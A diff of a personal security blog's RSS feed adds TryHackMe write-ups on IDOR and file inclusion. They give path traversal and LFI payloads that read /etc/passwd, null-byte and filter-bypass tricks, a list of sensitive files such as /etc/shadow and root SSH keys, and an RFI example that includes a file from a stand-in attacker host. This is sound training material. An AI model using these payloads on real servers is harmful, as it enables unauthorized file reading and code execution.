@@ -3,8 +3,8 @@
   <channel>
     <title>0xskar</title>
     <description>Documenting my Learning and other Interesting things</description>
-    <link>http://localhost:9999</link>
-    <atom:link href="http://localhost:9999/feed.xml" rel="self" type="application/rss+xml" />
+    <link>http://localhost:4000</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     <author>
       <name>0xskar</name>
       <email>0xskar@proton.me</email>
@@ -13,30 +13,30 @@
     
       <item>
         <title>TryHackMe - IDORs - Insecure Direct Object Refrences</title>
-        <description>&lt;h1 id=&quot;idors---insecure-direct-object-refrences&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;IDORs - Insecure Direct Object Refrences&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/idor&quot;&gt;https://tryhackme.com/room/idor&lt;/a&gt;&lt;/p&gt;
+        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/idor&quot;&gt;https://tryhackme.com/room/idor&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Learn how to find and exploit IDOR vulnerabilities in a web application giving you access to data that you shouldn’t have.&lt;/p&gt;
 
-&lt;h2 id=&quot;task-1-what-is-an-idor&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 1 What is an IDOR?&lt;/h2&gt;
-&lt;p&gt;In this room, you’re going to learn what an IDOR vulnerability is, what they look like, how to find them and a practical task exploiting a real case scenario.
-What is an IDOR?
-IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.
-This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.
-Answer the questions below
-What does IDOR stand for? Insecure Direct Object Reference&lt;/p&gt;
+&lt;h2 id=&quot;task-1-what-is-an-idor&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 1 What is an IDOR?&lt;/h2&gt;
+&lt;p&gt;IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.
+This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.&lt;/p&gt;
 
-&lt;h2 id=&quot;task-2-an-idor-example&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 2 An IDOR Example&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;What does IDOR stand for? Insecure Direct Object Reference&lt;/p&gt;
+
+&lt;h2 id=&quot;task-2-an-idor-example&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 2 An IDOR Example&lt;/h2&gt;
 &lt;p&gt;Imagine you’ve just signed up for an online service, and you want to change your profile information. The link you click on goes to http://online-service.thm/profile?user_id=1305, and you can see your information.&lt;/p&gt;
 
 &lt;p&gt;Curiosity gets the better of you, and you try changing the user_id value to 1000 instead (http://online-service.thm/profile?user_id=1000), and to your surprise, you can now see another user’s information. You’ve now discovered an IDOR vulnerability! Ideally, there should be a check on the website to confirm that the user information belongs to the user logged requesting it.&lt;/p&gt;
 
 &lt;p&gt;Using what you’ve learnt above, click on the View Site button and try and receive a flag by discovering and exploiting an IDOR vulnerability.&lt;/p&gt;
 
-&lt;p&gt;Answer the questions below
-What is the Flag from the IDOR example website?&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
 
-&lt;h2 id=&quot;task-3-finding-idors-in-encoded-ids&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 3 Finding IDORs in Encoded IDs&lt;/h2&gt;
+&lt;p&gt;What is the Flag from the IDOR example website?&lt;/p&gt;
+
+&lt;h2 id=&quot;task-3-finding-idors-in-encoded-ids&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 3 Finding IDORs in Encoded IDs&lt;/h2&gt;
 &lt;p&gt;Encoded IDs
 When passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it. Encoding ensures that the receiving web server will be able to understand the contents. Encoding changes binary data into an ASCII string commonly using the a-z, A-Z, 0-9 and = character for padding. The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot. You can use websites like https://www.base64decode.org/ to decode the string, then edit the data and re-encode it again using https://www.base64encode.org/ and then resubmit the web request to see if there is a change in the response.&lt;/p&gt;
 
@@ -44,30 +44,35 @@ When passing data from page to page either by post data, query strings, or cooki
 
 &lt;p&gt;&lt;img src=&quot;/assets/idor_encoded-ids.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Answer the questions below
-What is a common type of encoding used by websites?&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
 
-&lt;h2 id=&quot;task-4-finding-idors-in-hashed-ids&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 4 Finding IDORs in Hashed IDs&lt;/h2&gt;
+&lt;p&gt;What is a common type of encoding used by websites?&lt;/p&gt;
+
+&lt;h2 id=&quot;task-4-finding-idors-in-hashed-ids&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 4 Finding IDORs in Hashed IDs&lt;/h2&gt;
 &lt;p&gt;Hashed IDs
 Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern, such as being the hashed version of the integer value. For example, the Id number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.&lt;/p&gt;
 
-&lt;p&gt;It’s worthwhile putting any discovered hashes through a web service such as https://crackstation.net/ (which has a database of billions of hash to value results) to see if we can find any matches.
-Answer the questions below
-What is a common algorithm used for hashing IDs?&lt;/p&gt;
+&lt;p&gt;It’s worthwhile putting any discovered hashes through a web service such as https://crackstation.net/ (which has a database of billions of hash to value results) to see if we can find any matches.&lt;/p&gt;
 
-&lt;h2 id=&quot;task-5-finding-idors-in-unpredictable-ids&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 5 Finding IDORs in Unpredictable IDs&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;What is a common algorithm used for hashing IDs?&lt;/p&gt;
+
+&lt;h2 id=&quot;task-5-finding-idors-in-unpredictable-ids&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 5 Finding IDORs in Unpredictable IDs&lt;/h2&gt;
 &lt;p&gt;Unpredictable IDs
-If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users’ content using their Id number while still being logged in with a different account (or not logged in at all), you’ve found a valid IDOR vulnerability.
-Answer the questions below
-What is the minimum number of accounts you need to create to check for IDORs between accounts? 2&lt;/p&gt;
+If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users’ content using their Id number while still being logged in with a different account (or not logged in at all), you’ve found a valid IDOR vulnerability.&lt;/p&gt;
 
-&lt;h2 id=&quot;task-6-where-are-idors-located&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 6 Where are IDORs located&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;What is the minimum number of accounts you need to create to check for IDORs between accounts? 2&lt;/p&gt;
+
+&lt;h2 id=&quot;task-6-where-are-idors-located&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 6 Where are IDORs located&lt;/h2&gt;
 &lt;p&gt;Where are they located?
 The vulnerable endpoint you’re targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file.&lt;/p&gt;
 
 &lt;p&gt;Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to /user/details displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called user_id that you can use to display other users’ information, for example, /user/details?user_id=123.&lt;/p&gt;
 
-&lt;h2 id=&quot;task-7-a-practical-idor-example&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 7 A Practical IDOR Example&lt;/h2&gt;
+&lt;h2 id=&quot;task-7-a-practical-idor-example&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 7 A Practical IDOR Example&lt;/h2&gt;
 &lt;p&gt;Begin by pressing the Start Machine button; once started, click the below link and open it in a new browser tab:&lt;/p&gt;
 
 &lt;p&gt;https://LAB_WEB_URL.p.thmlabs.com&lt;/p&gt;
@@ -82,16 +87,318 @@ The vulnerable endpoint you’re targeting may not always be something you see i
 
 &lt;p&gt;&lt;img src=&quot;/assets/idor_example.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;You can try testing this id parameter for an IDOR vulnerability by changing the id to another user’s id. Try selecting users with IDs 1 and 3 and then answer the questions below.
-Answer the questions below
-What is the username for user id 1?
-What is the email address for user id 3?&lt;/p&gt;
+&lt;p&gt;You can try testing this id parameter for an IDOR vulnerability by changing the id to another user’s id. Try selecting users with IDs 1 and 3 and then answer the questions below.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;What is the username for user id 1?&lt;/p&gt;
+
+&lt;p&gt;What is the email address for user id 3?&lt;/p&gt;
 
 </description>
         <pubDate>Thu, 09 Jun 2022 00:00:00 -0700</pubDate>
-        <link>http://localhost:9999//TryHackMe-IDOR</link>
-        <link href="http://localhost:9999/TryHackMe-IDOR"/>
-        <guid isPermaLink="true">http://localhost:9999/TryHackMe-IDOR</guid>
+        <link>http://localhost:4000//TryHackMe-IDOR</link>
+        <link href="http://localhost:4000/TryHackMe-IDOR"/>
+        <guid isPermaLink="true">http://localhost:4000/TryHackMe-IDOR</guid>
+      </item>
+    
+      <item>
+        <title>TryHackMe - File Inclusion</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/fileinc&quot;&gt;https://tryhackme.com/room/fileinc&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;File inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-1-what-is-file-inclusion&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 1 What is File Inclusion?&lt;/h2&gt;
+
+&lt;p&gt;Information about file inclusion vulnerabilities; Local File Inclusions (LFIs), Remote File Inclusions (RFIs), and directory traversal.&lt;/p&gt;
+
+&lt;p&gt;Some web application are written to request access to files on a system, including images, static text, and so on via parameters. Parameters are query parameter string attached to the URL that could be used to retrieve data or perform actions based on user input. See pic below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/file-incursion.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Why do File inclusion vulnerabilities happen?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and imprted, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the risk of File inclusion?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;If the attacker can use file inclusion vulnerabilities to read sensitive data. In that case, the successful attack causes to leak of sensitive data, including code and files related to the web application, credentials for back-end systems. Moreover, if the attacker somehow can write to the server such as  /tmp directory, then it is possible to gain remote command execution RCE. However, it won’t be effective if file inclusion vulnerability is found with no access to sensitive data and no writing ability to the server.&lt;/p&gt;
+
+&lt;h2 id=&quot;task-2-deploy-the-vm&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 2 Deploy the VM&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/file-inclusion-lab-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;task-3-path-traversal&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 3 Path Traversal&lt;/h2&gt;
+
+&lt;p&gt;Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application’s URL to locate and access files or directories stored outside the application’s root directory.&lt;/p&gt;
+
+&lt;p&gt;Path traversal vulnerabilities occur when the user’s input is passed to a function such as file_get_contents in PHP. It’s important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. You can find more information about the function here.&lt;/p&gt;
+
+&lt;p&gt;The following graph shows how a web application stores files in /var/www/app. The happy path would be the user requesting the contents of userCV.pdf from a defined path /var/www/app/CVs.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/directory-traversal.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, which in this case get.php?file=, then the attacker may send something as follows, http://webapp.thm/get.php?file=../../../../etc/passwd&lt;/p&gt;
+
+&lt;p&gt;Suppose there isn’t input validation, and instead of accessing the PDF files at /var/www/app/CVs location, the web application retrieves files from other directories, which in this case /etc/passwd. Each .. entry moves one directory until it reaches the root directory /. Then it changes the directory to /etc, and from there, it read the passwd file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/directory-traversal2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As a result, the web application sends back the file’s content to the user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/directory-traversal3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:&lt;/p&gt;
+
+&lt;p&gt;http://webapp.thm/get.php?file=../../../../boot.ini or&lt;/p&gt;
+
+&lt;p&gt;http://webapp.thm/get.php?file=../../../../windows/win.ini&lt;/p&gt;
+
+&lt;p&gt;The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually c:.&lt;/p&gt;
+
+&lt;p&gt;Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Location&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/etc/issue&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;contains a message or system identification to be printed before the login prompt.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/etc/profile&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;controls system-wide default variables, such as Export variables, File creation&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;mask (umask), Terminal types, Mail messages to indicate when new mail has arrived&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/proc/version&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;specifies the version of the Linux kernel&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/etc/passwd&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;has all registered user that has access to a system&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/etc/shadow&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;contains information about the system’s users’ passwords&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/root/.bash_history&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;contains the history commands for root user&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/var/log/dmessage&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;contains global system messages, including the messages that are logged during system startup&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/var/mail/root&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;all emails for root user&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/root/.ssh/id_rsa&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Private SSH keys for a root or any known valid user on the server&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/var/log/apache2/access.log&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;the accessed requests for Apache  webserver&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;C:\boot.ini&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;contains the boot options for computers with BIOS firmware&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;What function causes path traversal vulnerabilities in PHP?&lt;/p&gt;
+
+&lt;h2 id=&quot;-task-4-local-file-inclusion---lfi&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt; Task 4 Local File Inclusion - LFI&lt;/h2&gt;
+
+&lt;p&gt;LFI attacks against web applications are often due to a developers’ lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. In this room, we’ll be picking on PHP, but it’s worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.&lt;/p&gt;
+
+&lt;p&gt;In this section, we will walk you through various LFI scenarios and how to exploit them.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Suppose the web application provides two languages, and the user can select between the EN and AR&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?PHP 
+	include($_GET[&quot;lang&quot;]);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.&lt;/p&gt;
+
+&lt;p&gt;Theoretically, we can access and display any readable file on the server from the code above if there isn’t any input validation. Let’s say we want to read the /etc/passwd file, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd&lt;/p&gt;
+
+&lt;p&gt;In this case, it works because there isn’t a directory specified in the include function and no input validation.&lt;/p&gt;
+
+&lt;p&gt;Now apply what we discussed and try to read /etc/passwd file. Also, answer question #1 below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/fileinc-lab1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Next, In the following code, the developer decided to specify the directory inside the function.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?PHP 
+	include(&quot;languages/&quot;. $_GET[&apos;lang&apos;]); 
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.&lt;/p&gt;
+
+&lt;p&gt;If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.&lt;/p&gt;
+
+&lt;p&gt;Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:&lt;/p&gt;
+
+&lt;p&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/p&gt;
+
+&lt;p&gt;Now apply what we discussed, try to read files within the server, and figure out the directory specified in the include function and answer question #2 below.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Give Lab #1 a try to read /etc/passwd. What would the request URI be? /etc/passwd (easy) or ../../../etc/passwd&lt;/p&gt;
+
+&lt;p&gt;In Lab #2, what is the directory specified in the include function? ../../../../etc/passwd&lt;/p&gt;
+
+&lt;h3 id=&quot;task-5-local-file-inclusion---lfi-2&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 5 Local File Inclusion - LFI #2&lt;/h3&gt;
+
+&lt;p&gt;In this task, we go a little bit deeper into LFI. We discussed a couple of techniques to bypass the filter within the include function.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don’t have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like:  include(languages/THM.php);.&lt;/p&gt;
+
+&lt;p&gt;If you look at the directory closely, we can tell the function includes files in the languages directory is adding  .php at the end of the entry. Thus the valid input will be something as follows:  index.php?lang=EN, where the file EN is located inside the given languages directory and named  EN.php.&lt;/p&gt;
+
+&lt;p&gt;Also, the error message disclosed another important piece of information about the full web application directory path which is /var/www/html/THM-4/&lt;/p&gt;
+
+&lt;p&gt;To exploit this, we need to use the ../ trick, as described in the directory traversal section, to get out the current folder. Let’s try the following:&lt;/p&gt;
+
+&lt;p&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/p&gt;
+
+&lt;p&gt;Note that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. But we still receive the following error:&lt;/p&gt;
+
+&lt;p&gt;Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12&lt;/p&gt;
+
+&lt;p&gt;It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00.&lt;/p&gt;
+
+&lt;p&gt;Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.&lt;/p&gt;
+
+&lt;p&gt;By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:&lt;/p&gt;
+
+&lt;p&gt;include(“languages/../../../../../etc/passwd%00”).”.php”); which equivalent to → include(“languages/../../../../../etc/passwd”);&lt;/p&gt;
+
+&lt;p&gt;NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.&lt;/p&gt;
+
+&lt;p&gt;Now apply what we showed in Lab #3, and try to read files /etc/passwd, answer question #1 below.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory.  Similarly, if we try  /etc/passwd/.., it results to be  /etc/ and that’s because we moved one to the root.  Now if we try  /etc/passwd/., the result will be  /etc/passwd since dot refers to the current directory.&lt;/p&gt;
+
+&lt;p&gt;Now apply this technique in Lab #4 and figure out to read /etc/passwd.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let’s test out and check the error message!&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/p&gt;
+
+&lt;p&gt;We got the following error!&lt;/p&gt;
+
+&lt;p&gt;Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15&lt;/p&gt;
+
+&lt;p&gt;If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.&lt;/p&gt;
+
+&lt;p&gt;First, we can send the following payload to bypass it: ….//….//….//….//….//etc/passwd&lt;/p&gt;
+
+&lt;p&gt;Why did this work?&lt;/p&gt;
+
+&lt;p&gt;This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn’t do another pass, leaving what is pictured below.&lt;/p&gt;
+
+&lt;p&gt;Try out Lab #5 and try to read /etc/passwd and bypass the filter!&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Finally, we’ll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Try this out in Lab #6 and figure what the directory that has to be present in the input field is.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Give Lab #3 a try to read /etc/passwd. What is the request look like? /lab3.php?file=../../../../etc/passwd%00&lt;/p&gt;
+
+&lt;p&gt;Which function is causing the directory traversal in Lab #4? file_get_contents&lt;/p&gt;
+
+&lt;p&gt;Try out Lab #6 and check what is the directory that has to be in the input field? THM-profile&lt;/p&gt;
+
+&lt;p&gt;Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value? THM-profile/../../../../etc/os-release 12.04&lt;/p&gt;
+
+&lt;h3 id=&quot;task-6-remote-file-inclusion---rfi&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 6 Remote File Inclusion - RFI&lt;/h3&gt;
+
+&lt;p&gt;Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.&lt;/p&gt;
+
+&lt;p&gt;The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Sensitive Information Disclosure&lt;/li&gt;
+  &lt;li&gt;Cross-site Scripting (XSS)&lt;/li&gt;
+  &lt;li&gt;Denial of Service (DoS)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.&lt;/p&gt;
+
+&lt;p&gt;RFI steps&lt;/p&gt;
+
+&lt;p&gt;The following figure is an example of steps for a successful RFI attack! Let’s say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?PHP echo &quot;Hello THM&quot;; ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
